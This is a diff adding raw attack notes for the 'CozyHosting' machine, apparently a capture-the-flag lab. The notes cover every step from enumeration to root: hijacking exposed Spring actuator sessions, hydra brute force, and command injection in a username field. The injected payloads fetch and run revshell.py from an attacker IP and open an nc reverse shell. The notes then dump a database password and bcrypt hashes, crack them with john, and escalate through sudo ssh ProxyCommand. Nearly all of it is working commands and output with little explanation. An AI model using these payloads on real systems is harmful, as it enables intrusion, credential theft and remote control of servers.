@@ -1,0 +1,143 @@
+
+
+
+10.10.11.230
+
+
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+
+
+
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+
+http://cozyhosting.htb/actuator ==> end poitnt
+
+http://cozyhosting.htb/actuator/sessions ==> sessions
+
+71E2924D210DE7725FCB6B7697AAFB3E	"kanderson"
+F6F67CAD2B610D91100EE92A20F1ACFB	"kanderson"
+F48486216DA30EE40D8D366DCACA9701	"UNAUTHORIZED"
+
+http://cozyhosting.htb/actuator/env
+
+dirsearch -u cozyhosting.htb -e "*" -r --cookie="JSESSIONID=F6F67CAD2B610D91100EE92A20F1ACFB"
+ 
+wfuzz -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H "Host: FUZZ.cozyhosting.htb" --hc 403,400,301 --hl 198 -t 50 10.10.11.230
+
+hydra -l kanderson -P /usr/share/wordlists/rockyou.txt cozyhosting.htb http-post-form "/login:username=^USER^&password=^PASS^:Invalid username or password"
+HYDRA_PROXY=connect://127.0.0.1:8080; export HYDRA_PROXY; printenv | grep HYDRA
+
+
+
+Please note
+For Cozy Scanner to connect the private key that you received upon registration should be included in your host's .ssh/authorised_keys file.
+
+dirsearch -u cozyhosting.htb -e "*" -r --cookie="JSESSIONID=1845D35D8FD4FE195E25B3DDB567D389" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium1.txt
+host=test.com&username=$(curl%0a10.10.16.72)
+
+HTTP/1.1 302 
+Server: nginx/1.18.0 (Ubuntu)
+Date: Wed, 06 Dec 2023 18:47:38 GMT
+Content-Length: 0
+Location: http://cozyhosting.htb/admin?error=curl: try 'curl --help' or 'curl --manual' for more information/bin/bash: line 2: 10.10.16.72: command not foundusage: ssh [-46AaCfGgKkMNnqsTtVvXxYy] [-B bind_interface]           [-b bind_address] [-c cipher_spec] [-D [bind_address:]port]           [-E log_file] [-e escape_char] [-F configfile] [-I pkcs11]           [-i identity_file] [-J [user@]host[:port]] [-L address]           [-l login_name] [-m mac_spec] [-O ctl_cmd] [-o option] [-p port]           [-Q query_option] [-R address] [-S ctl_path] [-W host:port]           [-w local_tun[:remote_tun]] destination [command [argument ...]]
+Connection: close
+X-Content-Type-Options: nosniff
+X-XSS-Protection: 0
+Cache-Control: no-cache, no-store, max-age=0, must-revalidate
+Pragma: no-cache
+Expires: 0
+X-Frame-Options: DENY
+
+{nc,10.10.16.72,443,-e,/bin/bash}
+{wget,10.10.16.72/revshell.py}
+host=test.com&username=$({curl,10.10.16.72/revshell.py,-o,/tmp/revshell.py})
+host=test.com&username=$({python3,/tmp/revshell.py})
+
+
+
+
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+app@cozyhosting:/app$ cat /etc/passwd|grep home
+syslog:x:107:113::/home/syslog:/usr/sbin/nologin
+app:x:1001:1001::/home/app:/bin/sh
+josh:x:1003:1003::/home/josh:/usr/bin/bash
+
+
+chisel server --port 8888 --reverse
+./chisel64 client 10.10.16.72:8888 R:socks
+./chisel64 client 10.10.16.72:8888 R:5432:127.0.0.1:5432 R:8081:127.0.0.1:8080
+
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:5432          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:3333            0.0.0.0:*               LISTEN      5523/python3        
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:8083            0.0.0.0:*               LISTEN      2761/python3        
+tcp6       0      0 :::22                   :::*                    LISTEN      -                   
+tcp6       0      0 127.0.0.1:8080          :::*                    LISTEN      1063/java  
+
+
+┌──(kali㉿kali)-[~/…/cozyhosting.htb/cloudhost/BOOT-INF/classes]
+└─$ cat application.properties 
+server.address=127.0.0.1
+server.servlet.session.timeout=5m
+management.endpoints.web.exposure.include=health,beans,env,sessions,mappings
+management.endpoint.sessions.enabled = true
+spring.datasource.driver-class-name=org.postgresql.Driver
+spring.jpa.database-platform=org.hibernate.dialect.PostgreSQLDialect
+spring.jpa.hibernate.ddl-auto=none
+spring.jpa.database=POSTGRESQL
+spring.datasource.platform=postgres
+spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting
+spring.datasource.username=postgres
+spring.datasource.password=Vg&nvzAQ7XxR
+
+psql -U postgres -h 127.0.0.1 -p 5432
+postgres Vg&nvzAQ7XxR
+
+ cozyhosting | postgres | UTF8     | libc            | en_US.UTF-8 | en_US.UTF-8 |            |           | 
+ postgres    | postgres | UTF8     | libc            | en_US.UTF-8 | en_US.UTF-8 |            |           | 
+ template0   | postgres | UTF8     | libc            | en_US.UTF-8 | en_US.UTF-8 |            |           | =c/postgres          +
+             |          |          |                 |             |             |            |           | postgres=CTc/postgres
+ template1
+
+
+\c cozyhosting
+
+ kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
+ admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admin
+
+$2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim
+$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm
+
+john --wordlist=/usr/share/wordlists/rockyou.txt userhash
+
+ssh josh@10.10.11.230
+manchesterunited
+
+josh@cozyhosting:~$ sudo -l
+[sudo] password for josh: 
+Matching Defaults entries for josh on localhost:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty
+
+User josh may run the following commands on localhost:
+    (root) /usr/bin/ssh *
+
+sudo /usr/bin/ssh -o ProxyCommand=';sh 0<&2 1>&2' x
+
+
+
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------
